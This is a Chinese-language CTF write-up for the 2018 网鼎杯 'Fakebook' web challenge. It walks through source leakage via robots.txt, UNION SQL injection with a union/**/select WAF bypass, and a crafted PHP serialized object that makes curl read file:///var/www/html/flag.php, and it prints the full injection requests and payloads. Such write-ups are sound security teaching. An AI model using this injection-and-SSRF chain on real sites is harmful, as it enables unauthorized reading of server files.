---
title: 网鼎杯 2018 - Web - Fakebook
date: 2026-11-14 18:36:00
categories:
  - CTF
  - 网鼎杯 2018
  - Web
tags:
  - SQL注入
  - SSRF
  - PHP反序列化
  - 源码泄露
cover: /img/cover/anime-characters-collage.jpg
description: 网鼎杯 2018 Web 题，综合 SQL 注入、SSRF 与 PHP 反序列化：robots.txt 泄漏源码，union 注入 view.php，构造 UserInfo 对象令 blog 指向 file 协议读 flag.php。
keywords:
  - Fakebook
  - SQL注入
  - SSRF
  - PHP反序列化
  - file协议
ai: >-
  本题是网鼎杯 2018 的 Web 综合题，围绕仿社交站点 Fakebook 展开。信息收集阶段由 robots.txt 发现 user.php.bak 源码备份，其中 UserInfo 类的 get 方法用 curl 请求 blog 指向的 URL，getBlogContents 在反序列化后被调用。攻击面集中在 view.php 的 no 参数，它未经过滤直接拼入 SQL，构成 UNION 注入，先用 order by 探得 4 列，再以 union 加内联注释绕过对空格与 union 关键字的 WAF 拦截。数据库 blog 列存放的是序列化 UserInfo 对象，于是把可控的序列化字符串注入进 UNION 查询结果，令其 blog 属性指向 file 协议的本地 flag.php。view.php 反序列化后调用 getBlogContents，curl 以 file 协议读取本地文件内容并以 base64 回显到 iframe，解码即得到 flag。全题考查源码泄露、注入绕 WAF、反序列化构造与 SSRF 读本地文件的完整串联。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | 网鼎杯 2018 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |

漏洞类型：SQL 注入（UNION）+ SSRF（curl file 协议）+ PHP 反序列化。

## 信息收集

1. `robots.txt` 泄漏 `user.php.bak` 源码备份。
2. 源码关键类 UserInfo：

```php
class UserInfo {
    public $name = "";
    public $age = 0;
    public $blog = "";
    public function __construct($name, $age, $blog) {
        $this->name = $name; $this->age = (int)$age; $this->blog = $blog;
    }
    function get($url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        // ...
        return $output;
    }
    public function getBlogContents() { return $this->get($this->blog); }
}
```

3. `view.php?no=` 存在 SQL 注入，`no` 参数直接拼入 SQL，有 WAF 过滤 `union` 加空格。
4. `view.php` 逻辑：查询 `no` 对应用户 → 对 `row['blog']` 执行 `unserialize` 反序列化 → `getBlogContents()` 用 curl 请求 blog URL，形成 SSRF 出口。

## 漏洞分析

### SQL 注入与 WAF 绕过

`no` 未过滤直接拼接，先探测列数：

```bash
# 探测列数
/view.php?no=1 order by 4   -> OK
/view.php?no=1 order by 5   -> ERROR
```

表共 **4 列**。`union select` 被 WAF 拦截（返回 no hack），用内联注释代替空格绕过：

```bash
# 被拦截
union select
# 绕过
union/**/select
```

### 反序列化 + SSRF 链

数据库 `blog` 列存的是序列化的 UserInfo 对象（`unserialize(): Error at offset...` 提示）。只要控制 UNION 查询第 4 列返回一个我们构造的序列化字符串，`view.php` 就会反序列化它并调用 `getBlogContents()`。

链中的 `get($url)` 用 curl 请求 `blog` 指定的 URL，未限制协议。把 `blog` 属性指向 `file:///var/www/html/flag.php`，curl 即以 `file://` 协议读取本地文件，实现 SSRF 任意文件读。

## 利用过程

### 1. 构造序列化对象

```php
O:8:"UserInfo":3:{s:4:"name";s:1:"x";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
```

`blog` 指向本地 `flag.php`，触发 `file://` 读文件。

### 2. UNION 注入携带序列化对象

```http
GET /view.php?no=0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"x";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' HTTP/1.1
Host: target
```

### 3. 结果

`view.php` 反序列化后调用 `getBlogContents()`，curl 以 `file://` 读取本地 `flag.php`，内容以 base64 回显到 iframe（base64 原文已脱敏）。解码得：

```php
<?php
$flag = "flag{xxxx}";
exit(0);
```

## 完整 EXP

> 归档 payload（脱敏后重组）。核心是「源码泄露定位 sink → UNION 注入注入序列化对象 → file 协议 SSRF」。

```bash
# robots.txt -> user.php.bak（源码备份）
# view.php?no= 存在 SQL 注入，order by 探得 4 列
# WAF 过滤 union 加空格，用 union/**/select 绕过
# 最终 GET（URL 编码空格后发送）：
# /view.php?no=0 union/**/select 1,2,3,'<序列化对象>'
```

最终请求：

```http
GET /view.php?no=0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"x";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' HTTP/1.1
Host: target
```

序列化对象（blog 指向 flag.php）：

```php
O:8:"UserInfo":3:{s:4:"name";s:1:"x";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
```

## Flag

脱敏后：`flag{xxxx}`。原值为 CTF2 格式 UUID，由 `getBlogContents()` 经 `file://` 读取 `flag.php` 后 base64 回显得到。

## 踩坑与总结

1. `robots.txt` 泄漏源码备份 `user.php.bak`，是定位 curl sink 的关键。
2. `view.php?no=` SQL 注入，`union/**/select` 用内联注释绕过 WAF 的空格与关键字过滤。
3. `blog` 列存序列化 UserInfo 对象，靠 UNION 注入把自定义序列化串写进结果集，触发 `unserialize`。
4. `getBlogContents()` 用 curl 且未限协议，`file://` 实现 SSRF 读本地 `flag.php`。
5. 先 `order by` 确认列数再构造 UNION；返回内容经 base64 回显，需解码。
